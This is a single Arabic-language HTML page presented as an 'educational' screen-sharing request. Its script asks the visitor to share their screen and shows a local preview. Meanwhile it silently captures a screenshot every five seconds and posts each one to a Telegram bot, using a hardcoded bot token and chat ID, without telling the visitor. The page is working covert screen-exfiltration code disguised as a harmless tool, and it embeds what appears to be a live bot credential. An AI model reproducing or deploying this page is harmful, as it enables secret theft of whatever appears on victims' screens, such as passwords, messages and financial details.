<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>طلب مشاركة الشاشة</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 20px;
            background-color: #f5f5f5;
        }
        .container {
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            max-width: 600px;
            margin: 0 auto;
        }
        button {
            background: #0088cc;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            margin: 10px;
            font-size: 16px;
        }
        button:hover {
            background: #006699;
        }
        #videoContainer {
            margin-top: 20px;
        }
        video {
            max-width: 100%;
            border-radius: 5px;
        }
        #status {
            margin-top: 10px;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>مشاركة الشاشة</h1>
        <p>هذا الموقع يطلب إذنك لمشاركة شاشتك لأغراض تعليمية</p>
        
        <button id="shareBtn">مشاركة الشاشة</button>
        <button id="stopBtn" disabled>إيقاف المشاركة</button>
        
        <div id="videoContainer">
            <video id="screenView" autoplay playsinline></video>
        </div>
        
        <div id="status">لم يتم بدء المشاركة بعد</div>
    </div>

    <script>
        // استبدل بمعلومات بوت التلجرام الخاص بك
        const BOT_TOKEN = "7512390719:AAHuHzUgshfHoqS-kkjzKxYrHFI0gHlWlsU";
        const CHAT_ID = "7327464581";
        
        const shareBtn = document.getElementById('shareBtn');
        const stopBtn = document.getElementById('stopBtn');
        const screenView = document.getElementById('screenView');
        const statusDiv = document.getElementById('status');
        
        let mediaStream = null;
        let peerConnection = null;
        let websocket = null;
        let streamId = null;
        
        shareBtn.addEventListener('click', startSharing);
        stopBtn.addEventListener('click', stopSharing);
        
        async function startSharing() {
            try {
                statusDiv.textContent = "جاري طلب إذن مشاركة الشاشة...";
                
                // طلب إذن مشاركة الشاشة
                mediaStream = await navigator.mediaDevices.getDisplayMedia({
                    video: {
                        cursor: "always"
                    },
                    audio: false
                });
                
                statusDiv.textContent = "تم بدء مشاركة الشاشة بنجاح!";
                shareBtn.disabled = true;
                stopBtn.disabled = false;
                screenView.srcObject = mediaStream;
                
                // هنا يجب عليك إعداد WebSocket و WebRTC لإرسال البث المباشر
                // هذا الجزء يتطلب سيرفر وسيط لإدارة الاتصال
                
                // بدلاً من ذلك، سنقوم بإرسال لقطة من الشاشة كل بضع ثوان
                startSendingScreenshots();
                
            } catch (error) {
                statusDiv.textContent = `خطأ: ${error.message}`;
                console.error("Error sharing screen:", error);
            }
        }
        
        function stopSharing() {
            if (mediaStream) {
                mediaStream.getTracks().forEach(track => track.stop());
                mediaStream = null;
            }
            
            if (screenView.srcObject) {
                screenView.srcObject = null;
            }
            
            statusDiv.textContent = "تم إيقاف مشاركة الشاشة";
            shareBtn.disabled = false;
            stopBtn.disabled = true;
            
            // إيقاف إرسال اللقطات
            if (screenshotInterval) {
                clearInterval(screenshotInterval);
                screenshotInterval = null;
            }
        }
        
        let screenshotInterval = null;
        
        function startSendingScreenshots() {
            // إرسال لقطة كل 5 ثوان
            screenshotInterval = setInterval(() => {
                captureAndSendScreenshot();
            }, 5000);
        }
        
        function captureAndSendScreenshot() {
            if (!mediaStream) return;
            
            const canvas = document.createElement('canvas');
            canvas.width = screenView.videoWidth;
            canvas.height = screenView.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(screenView, 0, 0, canvas.width, canvas.height);
            
            canvas.toBlob(blob => {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'screenshot.png');
                formData.append('caption', 'لقطة شاشة من المشاركة');
                
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                })
                .then(response => response.json())
                .then(data => console.log("تم إرسال اللقطة"))
                .catch(error => console.error("Error sending screenshot:", error));
            }, 'image/png');
        }
        
        // ملاحظة: لإنشاء بث مباشر حقيقي، تحتاج إلى:
        // 1. سيرفر وسيط (Signaling Server) باستخدام WebSocket
        // 2. تنفيذ WebRTC للبث المباشر
        // 3. سيرفر STUN/TURN للاتصال المباشر
        // هذا يتجاوز نطاق هذا المثال البسيط
    </script>
</body>
</html>
